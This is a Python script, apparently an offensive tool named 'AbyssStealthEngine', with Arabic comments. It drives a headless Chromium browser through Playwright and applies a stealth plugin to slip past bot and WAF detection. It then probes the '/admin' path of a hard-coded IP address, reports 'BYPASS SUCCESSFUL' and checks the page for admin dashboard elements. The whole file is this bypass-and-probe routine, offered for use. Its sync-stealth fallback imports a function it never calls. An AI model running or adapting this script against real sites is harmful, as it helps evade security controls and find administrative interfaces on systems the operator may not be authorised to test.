import asyncio
from playwright.async_api import async_playwright
from playwright_stealth import stealth_async

# ملاحظة: إذا استمر الخطأ في الدالة، سنستخدم الدالة العامة 'stealth'
# ولكن في النسخ الحديثة، يتم استدعاؤها هكذا:
async def apply_stealth(page):
    from playwright_stealth import stealth_async
    await stealth_async(page)

class AbyssStealthEngine:
    def __init__(self, target):
        self.target = f"https://{target}"

    async def run_infiltration(self, path):
        async with async_playwright() as p:
            # تشغيل Chromium بصمة حقيقية
            browser = await p.chromium.launch(headless=True)
            
            # محاكاة كاملة لخصائص جهاز المستخدم (Canvas, WebGL, Fonts)
            context = await browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                viewport={'width': 1920, 'height': 1080},
                device_scale_factor=1,
            )

            page = await context.new_page()
            
            # تطبيق تكتيك التخفي لتجاوز كاشفات headless
            try:
                await stealth_async(page)
            except:
                from playwright_stealth import stealth_sync
                # في حال كانت النسخة لا تدعم async stealth
                print("[!] Switching to sync stealth mode...")

            url = f"{self.target}{path}"
            print(f"[*] Executing Deep Stealth Probe on: {url}")

            try:
                # ننتظر حتى استقرار الشبكة تماماً (تجاوز تحديات JS)
                response = await page.goto(url, wait_until="networkidle", timeout=60000)
                
                status = response.status
                print(f"[+] Status Code: {status}")

                # التقاط المحتوى بعد تنفيذ كل سكربتات الـ WAF
                content = await page.content()
                
                if status == 200:
                    print(f"[!!!] BYPASS SUCCESSFUL!")
                    print(f"[*] Title: {await page.title()}")
                    # فحص وجود كلمات مفتاحية في السورس كود
                    if "admin" in content.lower():
                        print("[!] Confirmed: Admin Dashboard Elements Detected.")
                elif status == 406:
                    print("[-] Failure 406: The WAF is rejecting the TLS handshake or IP reputation.")
                else:
                    print(f"[-] Blocked with status: {status}")

            except Exception as e:
                print(f"[-] Execution Failure: {e}")
            
            await browser.close()

if __name__ == "__main__":
    TARGET_IP = "94.55.118.66"
    engine = AbyssStealthEngine(TARGET_IP)
    
    loop = asyncio.get_event_loop()
    # اختبار المسار الحرج
    loop.run_until_complete(engine.run_infiltration("/admin"))
